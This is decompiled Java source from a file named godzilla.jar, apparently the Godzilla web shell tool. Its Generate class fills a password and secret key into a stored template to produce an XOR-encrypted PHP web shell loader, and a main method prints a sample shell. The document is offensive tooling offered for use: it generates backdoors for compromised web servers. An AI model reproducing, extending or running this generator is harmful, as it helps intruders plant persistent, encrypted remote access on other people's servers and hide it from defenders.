/*    */ package shells.cryptions.phpXor;
/*    */ 
/*    */ import java.io.InputStream;
/*    */ import util.Log;
/*    */ import util.TemplateEx;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ class Generate
/*    */ {
/*    */   public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
/* 15 */     byte[] data = null;
/*    */     
/*    */     try {
/* 18 */       InputStream inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw.bin" : "base64.bin"));
/* 19 */       String code = new String(functions.readInputStream(inputStream));
/* 20 */       inputStream.close();
/* 21 */       code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
/* 22 */       code = TemplateEx.run(code);
/* 23 */       data = code.getBytes();
/*    */     }
/* 25 */     catch (Exception e) {
/* 26 */       Log.error(e);
/*    */     } 
/* 28 */     return data;
/*    */   }
/*    */   
/*    */   public static void main(String[] args) {
/* 32 */     System.out.println(new String(GenerateShellLoder("123", "456", false)));
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\phpXor\Generate.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */